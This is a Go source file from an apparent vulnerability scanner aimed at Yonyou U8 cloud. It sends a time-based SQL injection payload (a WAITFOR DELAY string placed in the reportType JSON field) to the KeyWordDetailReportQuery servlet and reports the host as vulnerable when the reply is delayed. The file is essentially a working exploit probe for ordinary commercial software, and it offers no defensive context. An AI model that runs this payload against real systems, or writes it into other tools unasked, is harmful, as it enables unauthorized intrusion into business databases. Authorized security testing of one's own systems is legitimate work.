package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func KeyWordDetailReportQueryScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	KeyWordDetailReportQuery := "用友 U8 cloud KeyWordDetailReportQuery SQL注入漏洞"
	urls := address + "/servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery"
	startTime := time.Now()
	response, _ := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader("{\"reportType\":\"';WAITFOR DELAY '0:0:5'--\",\"usercode\":\"18701014496\",\"keyword\":[{\"keywordPk\":\"1\",\"keywordValue\":\"1\",\"keywordIndex\":1}]}"))
	defer response.Body.Close()

	// 读取响应内容
	body, _ := ioutil.ReadAll(response.Body)

	elapsedTime := time.Since(startTime)

	if strings.Contains(string(body), "success") && elapsedTime.Seconds() > 4 {
		result := KeyWordDetailReportQuery + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, KeyWordDetailReportQuery, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, KeyWordDetailReportQuery)
		fmt.Println(output)
	}
}
